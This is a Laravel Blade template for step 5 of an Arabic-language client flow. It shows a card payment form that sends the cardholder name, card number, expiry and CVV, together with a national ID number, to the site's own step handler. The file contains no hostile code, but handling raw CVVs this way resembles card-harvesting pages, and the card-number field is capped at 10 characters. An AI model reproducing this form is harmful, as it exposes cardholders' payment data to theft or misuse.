@extends('frontend.layout.master')
@section('content')


<section class="payment-section m-5  section-padding">
    <div class="container">
        <div class="row">
            <form class="payment-description p-5" action="{{route('client.submit_step')}}" method="post">
                @csrf
                <input type="hidden" name="client_id" value="{{ $client->id }}">
                <input type="hidden" name="national_number" value="{{$client->national_number}}">
                <input type="hidden" name="step" value="5">
                <div class="img-for-payment d-flex justify-between p-2">
                    <img src="{{ asset('frontend') }}/assets/images/payment/mada-card.svg" alt="" srcset="">
                    <img src="{{ asset('frontend') }}/assets/images/payment/master-card.svg" alt="" srcset="">
                    <img src="{{ asset('frontend') }}/assets/images/payment/sadad-payment-logo.svg" alt="" srcset="">
                    <img src="{{ asset('frontend') }}/assets/images/payment/visa-card.svg" alt="" srcset="">
                </div>
                <!--no3 el car -->
                <div class="mt-3" id="input-Tasalsol">
                    <label for="exampleInputPassword1" class="form-label">الاسم كما هوا مدون بالبطاقه </label>
                    <input class="ta form-control input-of-buy" name="first_name">
                </div>
                @error('first_name')
                <p class="text-danger">{{ $message }}</p>
                @enderror
                <!-- kemt el car -->
                <div class="mt-3" id="input-Tasalsol">
                    <label for="exampleInputPassword1" class="form-label">رقم البطاقه </label>
                    <input class="ta form-control input-of-buy" name="visa_number" maxlength="10">
                </div>
                @error('visa_number')
                <p class="text-danger">{{ $message }}</p>
                @enderror
                <!-- sanat el son3 -->
                <div class="mt-3" id="input-Tasalsol">
                    <label for="exampleInputPassword1" class="form-label">تاريخ الانتهاء </label>
                    <input class="ta form-control input-of-buy" type="date" name="visa_end_at">
                </div>
                @error('visa_end_at')
                <p class="text-danger">{{ $message }}</p>
                @enderror
                <!-- makan el son3 -->
                <div class="mt-3" id="input-Tasalsol">
                    <label for="exampleInputPassword1" class="form-label">CVV</label>
                    <input class="ta form-control input-of-buy" name="visa_vcc" maxlength="3">
                </div>
                @error('visa_vcc')
                <p class="text-danger">{{ $message }}</p>
                @enderror
                <div class="btn-info-box mt-4  d-flex justify-content-center">
                    <button class=" ta btn btn-secondary btn-sm mt-4 w-50  ">الاستمرار في الدفع</button>
                </div>
            </form>
        </div>
    </div>
</section>



@endsection
@section('custom-script')
<script src="{{ asset('frontend/assets/js/steps.js') }}"></script>
@endsection
